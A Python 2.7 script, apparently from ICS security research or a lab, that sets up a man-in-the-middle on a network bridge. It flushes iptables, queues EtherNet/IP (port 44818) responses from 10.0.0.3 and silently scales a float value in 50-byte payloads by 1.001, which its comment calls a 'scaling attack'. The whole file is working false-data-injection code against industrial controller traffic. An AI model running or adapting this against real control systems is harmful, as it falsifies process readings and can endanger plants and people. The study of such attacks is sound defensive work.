#! /usr/bin/env python2.7

from netfilterqueue import NetfilterQueue
import os
import binascii
import struct
from scapy.all import *

print("Remember - bridge must already be started!")
os.system("modprobe br_netfilter")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -F")
os.system("iptables -F -t nat")
#os.system("iptables -A FORWARD -p tcp --dport 44818 -j NFQUEUE --queue-num 1") # Request (Read||Write)
os.system("iptables -A FORWARD -p tcp --sport 44818 -j NFQUEUE --queue-num 1") # Response

def modify(packet):
    pkt = IP(packet.get_payload())
    
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.3":
        if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
            print("Seba")
            mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
            payload = mydata[-8:]
            val = struct.unpack("<f", binascii.unhexlify(payload))[0]
            #scaling attack
            scaled = (1+0.001)*val
            newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
            pkt[Raw].load = newdata.decode('hex')
            del pkt[IP].chksum
            del pkt[TCP].chksum
    packet.drop()
    send(pkt)

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify)
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    print("Flushing iptables.")
    # This flushes everything, you might wanna be careful
    os.system('iptables -F')
    os.system('iptables -X')
    pass
